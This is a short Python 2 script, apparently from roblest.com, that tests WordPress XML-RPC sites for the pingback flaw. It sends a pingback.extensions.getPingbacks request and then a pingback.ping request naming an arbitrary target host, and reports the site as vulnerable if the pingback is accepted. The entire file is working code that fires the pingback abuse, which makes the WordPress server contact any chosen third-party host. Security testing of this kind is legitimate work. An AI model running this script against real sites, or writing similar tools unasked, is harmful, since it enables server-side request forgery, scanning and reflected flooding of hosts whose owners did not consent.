#!/usr/bin/python

import sys, getopt
from httplib2 import Http

def main(argv):
    wp_url = ''
    blog_page = ''
    target = ''
    try:
        opts, args = getopt.getopt(argv,"hu:p:t:",["url=","page=",'target='])
    except getopt.GetoptError:
        print 'wordpress_pingback_test.py -u <inputfile> -p <blog_page> -t <target>'
        sys.exit(2)
    for opt, arg in opts:
        if opt == '-h':
            print 'wordpress_pingback_test.py -u <inputfile> -p <blog_page> -t <target>'
            sys.exit()
        elif opt in ("-u", "--url"):
            wp_url = arg
        elif opt in ("-p", "--page"):
            blog_page = arg
        elif opt in ("-t", "--target"):
            target = arg
    if wp_url != '' and blog_page != '' and target != '':
        h = Http()
        print '******************************'
        print '* Wordpress Pingback Tester  *'
        print '* roblest.com                *'
        print '******************************'
        print '[!] Testing for Pingback Extensions'
        
        data = '''<?xml version="1.0"?>
        <methodCall>
            <methodName>pingback.extensions.getPingbacks</methodName>
            <params><param><string>%BLOG%</string></param></params>
        </methodCall>'''
        pingback = '''<?xml version="1.0" encoding="iso-8859-1"?>
        <methodCall>
            <methodName>pingback.ping</methodName>
            <params>
            <param><value><string>%TARGET%</string></value></param>
            <param><value><string>%BLOG%</string></value></param>
            </params>
        </methodCall>'''

        data = data.replace('%BLOG%',blog_page)
        pingback = pingback.replace('%BLOG%',blog_page).replace('%TARGET%',target)
        resp, content = h.request(wp_url, "POST", data)

        #print resp
        if '<fault>' in content:
            print "[-] Invalid Blog URL, please provide a valid one"
            print content
        elif '<array><data>' in content:
            print '[+] Pingback Extension confirmed'
            #print content
            print '[!] Testing Pingback'
            resp, content = h.request(wp_url, "POST", pingback)
            if 'The pingback has already been registered' in content:
                print "[-] The pingback has already been registered"
            elif '<fault>' in content:
                print content
                print '***************'
                print "[-] Not Vulnerable"

            elif 'Keep the web talking! :-)' in content:
                print content
                print '***************'
                print "[+] Vulnerable!"
    else:
        print 'wordpress_pingback_test.py -u <inputfile> -p <blog_page> -t <target>'
if __name__ == "__main__":
    main(sys.argv[1:])
